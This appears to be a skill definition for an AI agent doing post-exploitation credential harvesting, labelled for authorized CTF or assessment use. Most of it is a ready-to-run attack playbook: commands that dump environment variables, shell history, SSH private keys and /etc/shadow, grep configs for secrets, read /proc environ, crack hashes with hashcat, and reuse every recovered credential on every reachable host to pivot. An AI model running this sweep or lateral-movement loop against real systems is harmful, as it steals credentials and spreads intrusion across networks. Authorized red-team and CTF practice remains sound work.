name: credential-harvest
description: Post-exploitation credential harvesting — after getting a shell, systematically collect credentials from config files, shell history, SSH keys, databases, environment/process memory, and password reuse. These creds are the key to lateral movement (the next host/flag). Use immediately after any foothold, before pivoting.
---

# Credential Harvesting (post-exploitation)

Authorized CTF/assessment use. The shell you have is a stepping stone — the NEXT host (and the flag) opens with a credential you harvest here. Collect everything, then try every credential everywhere (password reuse is the #1 lateral win).

## 1. The fast sweep (run on every foothold)

```bash
env                               # env vars: DB creds, API keys, SECRET_KEY, tokens
cat ~/.bash_history ~/.zsh_history 2>/dev/null   # typed passwords, ssh/scp commands
ls -la ~/.ssh/; cat ~/.ssh/id_rsa ~/.ssh/authorized_keys 2>/dev/null
cat /etc/passwd /etc/shadow 2>/dev/null          # hashes (crack later)
find / -maxdepth 4 \( -name "*.env" -o -name "*.properties" -o -name "*config*" \) 2>/dev/null
grep -rniE "password|passwd|secret|token|api_key|jdbc|DATABASE_URL" /var/www /app /opt 2>/dev/null | head
```

## 2. Where creds hide (by source)

| Source | What / where |
|---|---|
| config files | `.env`, `config.py`, `*.properties`, `application.yml`, `web.config` (DB datasource, JWT secret, API keys) |
| shell history | `~/.bash_history` — `mysql -u root -pXXX`, `ssh user@host`, `curl -u` |
| SSH | `id_rsa`/`id_ed25519` (private keys), `authorized_keys`, `known_hosts` (host map) |
| databases | connect with recovered DB creds → dump user tables (accounts + hashes) |
| process memory | `/proc/*/environ`, `/proc/*/cmdline` (other services' secrets) |
| app source | hardcoded creds in `app.py`/`index.php`/`db.php` |
| logs | passwords in URLs (`/var/log/*/access.log`) |

## 3. Extract & reuse

1. **Crack hashes** (`/etc/shadow`, DB hashes): `hashcat -m 1800 shadow.txt` / `john`.
2. **Reuse everything everywhere:** the DB password likely works on SSH, the SSH key works on the next host, the admin password works on the OA panel. Try each recovered credential on every reachable service.
3. **Map the network** (`/etc/hosts`, `ip route`, ARP, `known_hosts`) — the next host is the one the creds open.

## 4. The lateral pattern

```
foothold → harvest (config/history/ssh/db) → a credential
→ SSH/DB/login into the NEXT host → repeat → deepest host → flag
```
Each hop re-runs this same sweep. Don't stop at "I have a shell" — that shell's creds are the bridge to the flag.

## Cross-cutting
- **Run the sweep IMMEDIATELY** — the cheapest, highest-yield step after any shell.
- **Password reuse is the exploit** — one leaked password opens more than one door; try it broadly.
- Self-verify: a recovered credential actually authenticates to the next service before pivoting.
